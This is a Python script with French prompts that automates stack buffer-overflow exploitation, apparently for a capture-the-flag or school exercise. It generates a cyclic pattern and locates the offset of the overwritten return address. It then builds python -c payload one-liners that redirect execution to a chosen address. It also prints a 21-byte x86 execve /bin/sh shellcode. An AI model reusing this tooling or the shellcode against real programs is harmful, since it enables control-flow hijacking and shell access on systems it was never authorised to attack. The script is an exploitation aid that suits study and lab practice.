import sys

string =	"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"
string +=	"JJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
string +=	"SSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000"
string +=	"111122223333444455556666777788889999"

def	Exit(script = None):
	print('if you need a 21 bytes execshell (source: https://shell-storm.org/shellcode/files/shellcode-517.html):')
	print('\'\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\'')
	if (script != None):
		print('if this isyou need a 21 bytes execshell (source: https://shell-storm.org/shellcode/files/shellcode-517.html):')
	exit()

def	ReplaceOffsetWithAddress(script, addr):
	if (len(addr) != 8):
		raise Exception("le second argument a besoin d'être une addresse constitué de 0x (optionnel) suivit des 8 charactères hexadecimals au format little endian.")

	rdda = ""
	for i in range(0, 4):
		rdda = '\\x' + str(addr[i * 2] + addr[i * 2 + 1]) + rdda
	script += ' + \'' + rdda + '\')"'
	print('script généré pour executer addresse voulue:')
	print(script)
	Exit()

def OffsetFinder(string, addr1, addr2 = None):
	if (len(addr1) != 8):
		raise Exception("le premier argument a besoin d'être une addresse constitué de 0x (optionnel) suivit des 8 charactères hexadecimals au format little endian.")

	patern = ""
	for i in range(0, 4):
		patern = chr(int(addr1[i * 2] + addr1[i * 2 + 1], 16)) + patern

	offset = string.find(patern)
	if (offset == -1):
		raise Exception("offset not find")

	string = string[:offset + 4] + "' " + string[offset + 4:]
	string = string[:offset] + " '" + string[offset:]
	script = 'python -c "print(\'A\' * ' + str(offset)
	print('string : ' + string)
	print('offset : ' + str(offset))
	print('script généré pour segfault')
	if (len(sys.argv) == 1 or len(sys.argv) == 2):
		print(script + ' + \'' + patern + '\')"')
		print()
		while (addr2 == None or (addr2 != "" and len(addr2) != 8 and len(addr2) != 10)):
			addr2 = input("écrire l addresse 0x (optionnel) suivit des 8 charactères à ajouter après le offset, ou entrer une valeur vide pour quitter: ")
		if (len(addr2) == 10):
			addr2 = addr2[2:]
	if (addr2 == ""):
		print ("fin du programme")
		Exit()
	
	ReplaceOffsetWithAddress(script, addr2)

def main():
	match len(sys.argv):
		case 1:
			print(string)
			addr = None
			print()
			while (addr == None or (addr != "" and len(addr) != 8 and len(addr) != 10)):
				addr = input("écrire l addresse 0x (optionnel) suivit des 8 charactères executée lors du segfault,\nou entrer une valeur vide pour quitter: ")
			if (len(addr) == 10):
				addr = addr[2:]
			if (addr == ""):
				Exit()
			print()
			OffsetFinder(string, addr)
		case 2:
			OffsetFinder(string, sys.argv[1])
		case 3:
			OffsetFinder(string, sys.argv[1], sys.argv[2])

if __name__ == "__main__":
	try:
		main()
	except Exception as err:
		print ("ERROR : " + str(err.args[0]))
